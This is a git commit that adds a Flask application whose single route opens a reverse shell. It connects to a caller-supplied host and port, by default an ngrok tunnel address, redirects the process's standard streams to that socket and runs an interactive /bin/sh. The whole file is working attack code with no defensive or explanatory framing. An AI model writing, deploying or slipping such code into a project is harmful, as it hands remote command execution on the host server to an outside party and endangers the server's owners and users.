6310a26fb4974655ace51d6b87913b62ec72ea34
Sid1337 <siddharthatripathy1@gmail.com>
2025-01-21 13:20:16 +0800

    Create application.py
    Flask reverse Shell

---
+++ reverse_shell/application.py
@@ -0,0 +1,32 @@
+from flask import Flask, request
+import socket
+import subprocess
+import os
+
+application = Flask(__name__)
+
+@application.route('/reverse_shell', methods=['GET'])
+def reverse_shell():
+    try:
+        # Get connection details from the GET request
+        host = request.args.get('host', '0.tcp.ap.ngrok.io')
+        port = int(request.args.get('port', '18996'))
+
+        # Create socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+
+        # Redirect stdin, stdout, stderr to the socket
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+
+        # Run interactive shell
+        subprocess.call(["/bin/sh", "-i"])
+
+        return "Shell executed", 200
+    except Exception as e:
+        return str(e), 500
+
+if __name__ == "__main__":
+    application.run(debug=True)
